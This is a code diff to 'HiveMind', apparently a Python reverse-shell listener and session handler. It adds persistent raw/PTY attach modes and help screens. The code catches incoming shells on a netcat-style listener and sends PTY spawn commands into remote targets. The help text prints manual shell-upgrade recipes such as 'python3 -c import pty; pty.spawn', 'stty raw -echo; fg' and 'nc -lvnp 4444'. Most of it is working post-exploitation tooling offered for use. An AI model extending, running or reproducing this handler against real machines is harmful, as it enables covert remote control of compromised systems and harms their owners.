@@ -58,7 +58,8 @@ PAYLOAD_TYPES = [
 # Command list now includes "listen" and "stop listener" among others.
 COMMANDS = [
     'alias', 'cleanup', 'cmd', 'clear', 'exit', 'help',
-    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade', 'raw', 'listen', 'stop listener'
+    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade', 'raw',
+    'help raw', 'help upgrade', 'listen', 'stop listener'
 ]
 
 # --- Global Structures for Sessions ---
@@ -68,6 +69,13 @@ class Session:
         self.conn = conn
         self.addr = addr
         self.last_heartbeat = time.time()  # Timestamp of last activity
+        # Saved interaction state.
+        # basic = original line-by-line mode.
+        # raw   = byte-forwarding mode used after raw/upgrade.
+        self.attach_mode = "basic"
+        # True after the Linux PTY upgrade command has been sent for this session.
+        # This prevents upgrade/session from sending the PTY command repeatedly.
+        self.pty_upgraded = False
 
 # sessions: mapping session_id (int) -> Session object
 sessions = {}
@@ -80,6 +88,7 @@ print_lock = threading.Lock()
 def safe_print(*args, **kwargs):
     with print_lock:
         print(*args, **kwargs)
+
 
 # --- Utility Functions ---
 def color(text, color_code):
@@ -110,16 +119,75 @@ def show_help():
     safe_print(colored("  clear                                - Clear the screen and reprint the header", "green"), flush=True)
     safe_print(colored("  exit                                 - Exit HiveMind", "green"), flush=True)
     safe_print(colored("  help                                 - Show this help menu", "green"), flush=True)
+    safe_print(colored("  help raw                             - Show manual raw attach equivalents", "green"), flush=True)
+    safe_print(colored("  help upgrade                         - Show manual Linux TTY upgrade commands", "green"), flush=True)
     safe_print(colored("  kill <id|alias>                      - Kill a session", "green"), flush=True)
-    safe_print(colored("  session <id|alias>                   - Interact with a specific session (basic mode)", "green"), flush=True)
+    safe_print(colored("  session <id|alias>                   - Interact using the session's saved mode", "green"), flush=True)
     safe_print(colored("  sessions                             - Show all active sessions", "green"), flush=True)
     safe_print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"), flush=True)
     safe_print(colored("  show payloads                        - List available payloads", "green"), flush=True)
-    safe_print(colored("  upgrade <id|alias>                   - Try Linux PTY upgrade, then attach in raw mode", "green"), flush=True)
-    safe_print(colored("  raw <id|alias>                       - Attach in raw mode without sending PTY commands", "green"), flush=True)
+    safe_print(colored("  upgrade <id|alias>                   - Try Linux PTY upgrade, save raw mode, then attach", "green"), flush=True)
+    safe_print(colored("  raw <id|alias>                       - Attach in raw mode and save raw mode for session", "green"), flush=True)
     safe_print(colored("  listen <port>                        - Start listener on specified port (default: 4444)", "green"), flush=True)
     safe_print(colored("  stop listener                        - Stop the current listener", "green"), flush=True)
     safe_print("", flush=True)
+
+def show_raw_help():
+    safe_print(colored("\n[ Help: raw ]", "yellow"), flush=True)
+    safe_print(colored("  HiveMind usage:", "cyan"), flush=True)
+    safe_print("    raw <id|alias>", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  What HiveMind does:", "cyan"), flush=True)
+    safe_print("    * Puts your local terminal into raw byte-forwarding mode.", flush=True)
+    safe_print("    * Sends no remote command to the target.", flush=True)
+    safe_print("    * Press Ctrl+] to return to the HiveMind menu.", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Manual netcat equivalent if you already caught a shell:", "cyan"), flush=True)
+    safe_print("    Ctrl+Z", flush=True)
+    safe_print("    stty raw -echo; fg", flush=True)
+    safe_print("    # Press Enter once after it resumes", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Better Windows ConPTY listener from the start:", "cyan"), flush=True)
+    safe_print("    stty raw -echo; (stty size; cat) | nc -lvnp 4444", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Fix your local terminal after raw mode if it gets weird:", "cyan"), flush=True)
+    safe_print("    stty sane", flush=True)
+    safe_print("    reset", flush=True)
+    safe_print("", flush=True)
+
+
+def show_upgrade_help():
+    safe_print(colored("\n[ Help: upgrade ]", "yellow"), flush=True)
+    safe_print(colored("  HiveMind usage:", "cyan"), flush=True)
+    safe_print("    upgrade <id|alias>", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  What HiveMind does:", "cyan"), flush=True)
+    safe_print("    * Sends a Linux PTY spawn command to the target.", flush=True)
+    safe_print("    * Sends a terminal resize command.", flush=True)
+    safe_print("    * Saves the session as raw + Linux PTY so future session <id> reuses it.", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Manual Linux TTY upgrade commands:", "cyan"), flush=True)
+    safe_print("    python3 -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")'", flush=True)
+    safe_print("    python -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")'", flush=True)
+    safe_print("    script -qc /bin/bash /dev/null", flush=True)
+    safe_print("    /bin/sh -i", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Manual local terminal raw step after spawning a PTY:", "cyan"), flush=True)
+    safe_print("    Ctrl+Z", flush=True)
+    safe_print("    stty raw -echo; fg", flush=True)
+    safe_print("    # Press Enter once after it resumes", flush=True)
+    safe_print("", flush=True)
+    rows, cols = get_terminal_rows_cols()
+    safe_print(colored("  Manual terminal settings inside the remote shell:", "cyan"), flush=True)
+    safe_print(f"    # Current local terminal size detected: {rows} rows, {cols} cols", flush=True)
+    safe_print("    export TERM=xterm", flush=True)
+    safe_print(f"    stty rows {rows} cols {cols}", flush=True)
+    safe_print("", flush=True)
+    safe_print(colored("  Fix your local terminal after raw mode if it gets weird:", "cyan"), flush=True)
+    safe_print("    stty sane", flush=True)
+    safe_print("    reset", flush=True)
+    safe_print("", flush=True)
+
 
 def list_payloads():
     safe_print(colored("\n[ Available Payloads ]", "blue"), flush=True)
@@ -374,6 +442,15 @@ def interactive_shell(session_id):
             safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
             return
         session = sessions[session_id]
+        attach_mode = getattr(session, "attach_mode", "basic")
+        pty_upgraded = getattr(session, "pty_upgraded", False)
+
+    if attach_mode == "raw":
+        mode_label = "raw + Linux PTY" if pty_upgraded else "raw"
+        safe_print(colored(f"[*] Session {session_id} is saved as {mode_label}. Using raw attach.", "yellow"), flush=True)
+        raw_attach_session(session_id, auto_pty=False, remember=False)
+        return
+
     safe_print(colored(f"\n[*] Switched to session {session_id}. Press Ctrl+C to return to HiveMind menu.\n", "yellow"), flush=True)
     try:
         while True:
@@ -413,8 +490,10 @@ def get_terminal_rows_cols():
         return 24, 80
 
 
-def drain_session_output(session, timeout=0.35):
-    """Print any data currently waiting on a session socket."""
+def drain_session_output(session, timeout=0.35, print_output=True):
+    """Drain any data currently waiting on a session socket.
+    Set print_output=False when setup commands should stay quiet.
+    """
     end_time = time.time() + timeout
     got_data = False
     while time.time() < end_time:
@@ -434,7 +513,8 @@ def drain_session_output(session, timeout=0.35):
             return got_data
         got_data = True
         session.last_heartbeat = time.time()
-        safe_print(data.decode(errors="ignore"), end="", flush=True)
+        if print_output:
+            safe_print(data.decode(errors="ignore"), end="", flush=True)
     return got_data
 
 
@@ -453,32 +533,38 @@ def try_linux_pty_upgrade(session):
     )
     resize_cmd = f"stty rows {rows} cols {cols}; export TERM=xterm\n"
 
-    safe_print(colored("[*] Trying Linux PTY spawn first...", "yellow"), flush=True)
-    safe_print(colored("[*] If this is a Windows/ConPty shell, use raw <id|alias> instead.", "yellow"), flush=True)
     try:
         session.conn.send(pty_cmd.encode())
         time.sleep(0.35)
-        drain_session_output(session, timeout=0.25)
+        drain_session_output(session, timeout=0.25, print_output=False)
         session.conn.send(resize_cmd.encode())
         time.sleep(0.15)
-        drain_session_output(session, timeout=0.20)
+        drain_session_output(session, timeout=0.20, print_output=False)
     except Exception as e:
         safe_print(colored(f"[-] PTY upgrade command failed to send: {e}", "red"), flush=True)
 
 
-def raw_attach_session(session_id, auto_pty=False):
+def raw_attach_session(session_id, auto_pty=False, remember=True):
     """
     Attach to a session in raw byte-forwarding mode.
     auto_pty=True first tries to spawn a remote Linux PTY.
+    remember=True saves this session so future `session <id>` uses raw mode.
     """
     with lock:
         if session_id not in sessions:
             safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
             return
         session = sessions[session_id]
+        already_pty_upgraded = getattr(session, "pty_upgraded", False)
 
     if auto_pty:
-        try_linux_pty_upgrade(session)
+        if already_pty_upgraded:
+            safe_print(colored(f"[*] Session {session_id} is already marked as Linux PTY-upgraded. Skipping PTY command.", "yellow"), flush=True)
+        else:
+            try_linux_pty_upgrade(session)
+            with lock:
+                if session_id in sessions:
+                    sessions[session_id].pty_upgraded = True
 
     try:
         import tty, termios
@@ -492,11 +578,31 @@ def raw_attach_session(session_id, auto_pty=False):
         safe_print(colored(f"[-] Could not read local terminal settings: {e}", "red"), flush=True)
         return
 
+    if remember:
+        with lock:
+            if session_id in sessions:
+                sessions[session_id].attach_mode = "raw"
+                if auto_pty:
+                    sessions[session_id].pty_upgraded = True
+        saved_label = "raw + Linux PTY" if auto_pty or already_pty_upgraded else "raw"
+        safe_print(colored(f"[*] Session {session_id} saved as {saved_label}. Future `session {session_id}` will reuse it.", "green"), flush=True)
+
     safe_print(colored(f"\n[*] Raw attach to session {session_id}. Press Ctrl+] to return to HiveMind menu.", "yellow"), flush=True)
-    safe_print(colored("[*] In raw mode your typed characters may not echo. Try typing: id", "yellow"), flush=True)
+    safe_print(colored("[*] If the screen looks blank, press Enter once or type a command like: id", "yellow"), flush=True)
 
     try:
         tty.setraw(sys.stdin.fileno())
+
+        # Raw mode can look like it "kicked you out" because the last prompt may
+        # have been printed before the local terminal switched to raw mode. Send one
+        # harmless newline to wake the remote prompt after attaching. This is also
+        # what makes future `session <id>` feel re-attached after a saved raw/PTTY
+        # session.
+        try:
+            session.conn.send(b"\n")
+        except Exception:
+            pass
+
         while True:
             r, _, _ = select.select([session.conn, sys.stdin], [], [], 0.1)
             if session.conn in r:
@@ -541,8 +647,9 @@ def raw_attach_session(session_id, auto_pty=False):
 
 
 def upgrade_session(session_id):
-    """Try a Linux PTY upgrade, then attach in raw mode."""
-    raw_attach_session(session_id, auto_pty=True)
+    """Try a Linux PTY upgrade once, save raw mode, then attach."""
+    safe_print(colored(f"[*] Attempting to upgrade Session {session_id}...", "yellow"), flush=True)
+    raw_attach_session(session_id, auto_pty=True, remember=True)
 
 def list_sessions():
     safe_print(colored("\n[ Active Sessions ]", "blue"), flush=True)
@@ -558,7 +665,10 @@ def list_sessions():
                         if asid == sid:
                             alias_str = f" (alias: {alias})"
                             break
-                    safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]}", "green"), flush=True)
+                    attach_mode = getattr(session, "attach_mode", "basic")
+                    pty_upgraded = getattr(session, "pty_upgraded", False)
+                    mode_label = "raw+pty" if attach_mode == "raw" and pty_upgraded else attach_mode
+                    safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]} [mode: {mode_label}]", "green"), flush=True)
                 except Exception:
                     safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
     safe_print("", flush=True)
@@ -595,7 +705,14 @@ def completer(text, state):
     else:
         current_token_index = len(tokens) - 1
 
-    if tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
+    if tokens and tokens[0].lower() == "help":
+        if current_token_index == 1:
+            options = [topic for topic in ["raw", "upgrade"] if topic.startswith(text)]
+            if state < len(options):
+                return options[state]
+            return None
+        return None
+    elif tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
         if current_token_index == 2:
             options = [p for p in PAYLOAD_TYPES if p.startswith(text)]
             if state < len(options):
@@ -706,7 +823,8 @@ def command_line():
             if sid is None:
                 safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
             else:
-                raw_attach_session(sid, auto_pty=False)
+                safe_print(colored(f"[*] Attaching Session {sid} in raw mode...", "yellow"), flush=True)
+                raw_attach_session(sid, auto_pty=False, remember=True)
 
         elif lower_cmd.startswith("alias "):
             if len(parts) != 3:
@@ -783,8 +901,15 @@ def command_line():
                 stop_listener()
             break
 
-        elif lower_cmd == "help":
-            show_help()
+        elif lower_cmd.startswith("help"):
+            if lower_cmd == "help":
+                show_help()
+            elif len(parts) == 2 and parts[1].lower() == "raw":
+                show_raw_help()
+            elif len(parts) == 2 and parts[1].lower() == "upgrade":
+                show_upgrade_help()
+            else:
+                safe_print(colored("[-] Usage: help [raw|upgrade]", "red"), flush=True)
 
         else:
             safe_print(colored("[-] Unknown command.", "red"), flush=True)
